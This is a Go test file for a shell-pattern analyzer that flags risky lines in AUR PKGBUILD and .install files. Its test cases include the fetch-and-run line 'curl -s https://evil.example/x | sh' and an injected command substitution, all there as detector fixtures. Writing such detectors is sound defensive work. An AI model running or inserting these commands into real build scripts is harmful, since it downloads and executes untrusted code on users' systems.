package analyzer

import (
	"context"
	"strings"
	"testing"

	"github.com/pramod/aur-curator/internal/git"
)

// TestShellCommentLines494: a Shell match on a line starting with # is one
// Low shell_in_comment finding, never skipped: inside a multi-line string
// or an unquoted heredoc such a line runs (analyzer-specs.md § Comment
// Lines).
func TestShellCommentLines494(t *testing.T) {
	tests := []struct {
		name string
		line string
		want []string // categories, in order
	}{
		{"backticks in a comment (tor-browser-bin:58)", "# Make a string suitable for `sed`, by escaping `[]/&$.*^\\`", []string{CategoryShellInComment}},
		{"indented comment", "    # No need for `makepkg -g`: the checksums are fixed", []string{CategoryShellInComment}},
		{"tab-indented comment", "\t# use $(nproc) jobs", []string{CategoryShellInComment}},
		{"download and pipe on a # line: one finding", "# $(curl -s https://evil.example/x | sh)", []string{CategoryShellInComment}},
		{"comment without a pattern", "# fix the build on gcc 15", nil},
		{"trailing comment after code: scanned as code", "make -j$(nproc) # parallel", []string{CategoryShellExec}},
		{"code with curl", "curl -s https://evil.example/x | sh", []string{CategoryNetworkDownload, CategoryShellExec}},
		{"# inside code is not a comment line", "echo \"#$(id)\"", []string{CategoryShellExec}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := scanLine("shell", tt.line, "PKGBUILD", 3)
			var cats []string
			for _, f := range got {
				cats = append(cats, f.Category)
			}
			if strings.Join(cats, ",") != strings.Join(tt.want, ",") {
				t.Fatalf("categories = %v, want %v", cats, tt.want)
			}
			if len(got) == 1 && got[0].Category == CategoryShellInComment {
				if want := "Comment line (runs only inside a string or heredoc): " + tt.line; got[0].Summary != want {
					t.Errorf("Summary = %q, want %q", got[0].Summary, want)
				}
				if got[0].Location != "PKGBUILD:3" {
					t.Errorf("Location = %q", got[0].Location)
				}
			}
		})
	}
}

// TestShellCommentLineInInstall494: .install files follow the same rule.
func TestShellCommentLineInInstall494(t *testing.T) {
	diff := &git.GitDiff{Files: []git.FileDiff{{
		Path: "foo.install", Kind: git.FileKindInstall,
		Patch: "diff --git a/foo.install b/foo.install\n--- a/foo.install\n+++ b/foo.install\n@@ -1,1 +1,2 @@\n post_install() {\n+  # run `ldconfig` here\n",
	}}}
	findings, err := (&shellAnalyzer{}).Run(context.Background(), diff)
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, f := range findings {
		got = append(got, f.Category)
	}
	if !strings.Contains(strings.Join(got, ","), CategoryShellInComment) || strings.Contains(strings.Join(got, ","), CategoryShellExec) {
		t.Errorf("categories = %v, want shell_in_comment (and install_changed), no shell_exec", got)
	}
}
